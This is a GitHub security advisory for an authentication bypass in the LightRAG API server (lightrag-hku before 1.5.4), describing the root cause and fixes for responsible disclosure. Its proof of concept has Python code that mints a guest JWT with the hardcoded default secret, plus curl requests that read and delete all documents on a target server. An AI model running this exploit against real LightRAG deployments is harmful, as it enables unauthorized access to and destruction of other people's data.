# [C] LightRAG is Vulnerable to Authentication Bypass: hardcoded DEFAULT_TOKEN_SECRET and public /auth-status defeat LIGHTRAG_API_KEY protection

## Summary
Severity: Critical
Advisory: GHSA-f4vv-55c2-5789
CVE: CVE-2026-61740
CWE: CWE-287, CWE-798
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-f4vv-55c2-5789
Type: github-advisory

## Affected
- PyPI: `lightrag-hku` — affected >=0 <1.5.4

## Details
## Summary

When LightRAG is deployed with `LIGHTRAG_API_KEY` set but `AUTH_ACCOUNTS` unset (an officially documented "API-Key authentication" mode), the `X-API-Key` protection can be bypassed by any remote unauthenticated attacker. The bypass does not require network contact with the victim server — an attacker can mint a valid guest JWT offline using the hardcoded `DEFAULT_TOKEN_SECRET` committed in the repository and then call any endpoint guarded by `Depends(combined_auth)`, including destructive operations such as `DELETE /documents`, `POST /documents/upload`, `/documents/clear_cache`, and `POST /query`.

This is distinct from the previously-fixed GHSA-mcww-4hxq-hfr3 / CVE-2026-30762, which only covered the `AUTH_ACCOUNTS`-configured case. The API-Key-only deployment profile is still fully exploitable on current `main` (commit `157c331`, v1.4.15).

## Root cause

Three independent issues combine:

1. `lightrag/api/config.py:54` ships a hardcoded default JWT secret:
   ```python
   DEFAULT_TOKEN_SECRET="lightr...key!"
   ```
2. `lightrag/api/auth.py:28-38` falls back to `DEFAULT_TOKEN_SECRET` with only a warning log when `AUTH_ACCOUNTS` is not configured. The fix for CVE-2026-30762 only raises when `AUTH_ACCOUNTS` is set, so the API-key-only path is silently vulnerable.
3. `lightrag/api/lightrag_server.py:1140-1186` exposes `GET /auth-status` and `POST /login` without any authentication dependency. In the API-key-only configuration, `auth_handler.accounts` is empty, and both endpoints unconditionally mint and return a signed guest JWT.
4. `lightrag/api/utils_api.py:214-216` inside `combined_dependency` short-circuits authorization on any valid guest token when `auth_configured` is false, **before** reaching the `X-API-Key` check on line 237:
   ```python
   if not auth_configured and token_info.get("role") == "guest":
       return
   ```

## Proof of concept (offline-minted token, zero server contact)

Tested against a clean install of commit `157c331` running locally with only `LIGHTRAG_API_KEY=super-...ass` configured.

```bash
$ python3 - <<'PY'
import jwt
from datetime import datetime, timedelta, timezone
print(jwt.encode(
    {"sub":"guest","role":"guest",
     "exp":datetime.now(timezone.utc)+timedelta(hours=24),
     "metadata":{"auth_mode":"disabled"}},
    "lightrag-jwt-default-secret-key!",
    algorithm="HS256"))
PY
eyJhbGci...

# Control — no creds: correctly rejected
$ curl -s -w "HTTP %{http_code}\n" http://target:9876/documents
{"detail":"API Key required"}
HTTP 403

# Control — wrong API key: correctly rejected
$ curl -s -w "HTTP %{http_code}\n" -H "X-API-Key: wrong-key" http://target:9876/documents
{"detail":"Invalid API Key"}
HTTP 403

# Bypass — offline-minted guest JWT: accepted
$ curl -s -w "HTTP %{http_code}\n" -H "Authorization: Bearer *** \
    http://target:9876/documents
{"statuses":{}}
HTTP 200

# Destructive confirmation — DELETE /documents with the same token
$ curl -s -X DELETE -w "HTTP %{http_code}\n" -H "Authorization: Bearer *** \
    http://target:9876/documents
{"status":"success","message":"All documents cleared successfully. Deleted 0 files."}
HTTP 200
```

The guest JWT also does not need to be minted offline — `GET /auth-status` hands one out to anyone, even when the server is started with `LIGHTRAG_API_KEY` set. Either path (offline or `/auth-status`) yields the same bypass.

## Impact

Any LightRAG instance that is reachable on the network and configured with:
- `LIGHTRAG_API_KEY` set (i.e. the operator believes the server is protected), and
- `AUTH_ACCOUNTS` unset (i.e. they opted out of the password-based login flow)

is fully accessible to any anonymous caller. This configuration is documented as the "simple API-Key authentication" mode in `docs/LightRAG-API-Server.md`, so it is expected to be common in production. An attacker can:

- Read and delete arbitrary documents (`/documents`, `DELETE /documents`)
- Upload arbitrary documents and text for ingestion (`/documents/upload`, `/documents/text`, `/documents/texts`, `/documents/file_batch`, `/documents/scan`)
- Clear LLM / embedding caches (`/documents/clear_cache`)
- Inspect and mutate the knowledge graph (`/graph/*`)
- Run arbitrary queries that will consume paid LLM / embedding credits (`/query`, `/query/stream`)

Because the server may be exposed behind corporate reverse proxies that trust `LIGHTRAG_API_KEY`, this also lets the attacker bypass perimeter authentication that the operator assumed was sufficient.

## Suggested CVSS

7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L` (High). Unauthenticated, network-reachable, affects confidentiality and integrity of all ingested documents and knowledge graphs; availability impact via cache wipes and credit exhaustion.

## Suggested fix

Any one of the following individually closes the primary vector; all three are recommended for defense in depth:

1. **Remove the hardcoded fallback.** Mirror the fix for CVE-2026-30762: refuse to start (or emit a randomly-generated ephemeral secret that is not exported) whenever `TOKEN_SECRET` is unset, regardless of `AUTH_ACCOUNTS`.
2. **Gate `/auth-status` and `/login` when `LIGHTRAG_API_KEY` is set.** Either require `Depends(combined_auth)` or stop minting guest tokens whenever `api_key_configured` is true.
3. **Fix the short-circuit in `combined_dependency`.** Do not accept guest tokens as authentication when `api_key_configured` is true; always require a valid `X-API-Key` header in that configuration.

## Affected versions

- `main` through commit `157c331` (2026-04-15)
- Most recent release v1.4.15 and all prior releases that ship the API-Key-only code path

## Prior art checked

- GHSA-8ffj-4hx4-9pgf / CVE-2026-39413 — JWT `alg:none`. Unrelated.
- GHSA-mcww-4hxq-hfr3 / CVE-2026-30762 — hardcoded JWT secret combined with `AUTH_ACCOUNTS`. Fixed by PR #2869, which explicitly does **not** cover the API-Key-only configuration.
- Issues/PRs searched: "guest token bypass", "DEFAULT_TOKEN_SECRET", "hardcoded secret", "auth-status", "api key bypass". No prior report covering this vector.

## Discovery

Found during an external security review of LightRAG's API authentication flow. Reporter can be credited publicly as "patchmyday (Jason Zhang)" upon disclosure.

## References
- https://github.com/HKUDS/LightRAG/security/advisories/GHSA-f4vv-55c2-5789
- https://nvd.nist.gov/vuln/detail/CVE-2026-61740
- https://github.com/HKUDS/LightRAG/pull/3319
- https://github.com/HKUDS/LightRAG/commit/f7819aa3a49a9d8d92eed8251d82d6ebcafa8cba
- https://github.com/HKUDS/LightRAG
- https://github.com/HKUDS/LightRAG/releases/tag/v1.5.4
